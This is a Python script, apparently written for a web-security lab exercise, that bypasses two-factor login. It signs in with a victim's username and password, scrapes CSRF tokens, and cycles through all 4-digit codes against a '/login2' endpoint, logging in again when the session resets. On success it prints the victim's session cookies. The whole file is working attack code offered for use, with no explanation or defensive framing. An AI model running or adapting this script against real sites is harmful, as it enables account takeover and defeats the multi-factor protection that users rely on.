import requests
import sys
import urllib3
from bs4 import BeautifulSoup

def get_csrf_token (url,session):
    print("(+) Extracting the csrf token ...")
    response = session.get(url,verify=False, proxies=proxy)
    soup = BeautifulSoup(response.text,"html.parser")
    csrf_token = soup.find("input")["value"]
    
    print("(+) csrf token is \"%s\" " %csrf_token)

    return csrf_token


proxy = {
        "http":"http://127.0.0.1:8080",
        "https":"http://127.0.0.1:8080"
        }
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

numbers = ['0','1','2','3','4','5','6','7','8','9'] 

# function to login 
def login (url:str,session:requests.Session,username:str,password:str,csrf_token:str):
    print(f"(+) Login in using {username}:{password}:{csrf_token}...")
    params = {
        "username": username,
        "password" :password,
        "csrf": csrf_token
    }
    session.post(url,verify=False,data=params,proxies=proxy)
    return session



# function to extract csrf tokens
def extract_csrf_tokens(url:str,session:requests.Session):
    print("(+) Extracting the csrf token ...")
    response = session.get(url,verify=False, proxies=proxy)
    soup = BeautifulSoup(response.text,"html.parser")
    csrf_token = soup.find("input")["value"]

    return csrf_token

def brute_froce_otp(url,username,password):
    login_url = url + '/login'
    otp_url = url + '/login2'
    session = requests.Session() # intializing session object
    login_csrf_token = extract_csrf_tokens(login_url,session)

    session = login(login_url,session,username,password,login_csrf_token) # updating session object

    loged_in = False 
    while True:
        for first_digit in numbers:
            for second_digit in numbers:
                for third_digit in numbers:
                    for forurth_digit in numbers:
                        
                        otp = first_digit + second_digit + third_digit+ forurth_digit
                        print(f"(+) Trying OTP = {otp}")
                        params= {
                            "mfa-code":otp,
                            'csrf':extract_csrf_tokens(otp_url,session)
                        }
                        response = session.post(otp_url,verify=False,proxies=proxy,data=params)
                        
                        if "Please enter your 4-digit security code" not in response.text:
                            login(login_url,session,username,password,csrf_token=extract_csrf_tokens(login_url,session))
                            
                        if response.url != login_url and response.url != otp_url :
                            print("*************************Loged In*************************")
                            print("(+) We Logged in Victim's Account ")
                            print(f"(+) Use this Cookies to login {session.cookies}")
                            loged_in = True
                            print("*********************************************************")
                            sys.exit(-1)
        if loged_in:
            sys.exit(-1)
            pass #break








def main():
    if len(sys.argv) !=4:
        print(f"(-) Usage {sys.argv[0]} http://example.com 'victim_username' 'victim_password'")
        sys.exit(-1)

    url = sys.argv[1]
    username = sys.argv[2]
    password = sys.argv[3]


    brute_froce_otp(url,username,password)

if __name__ =="__main__":
    
    main()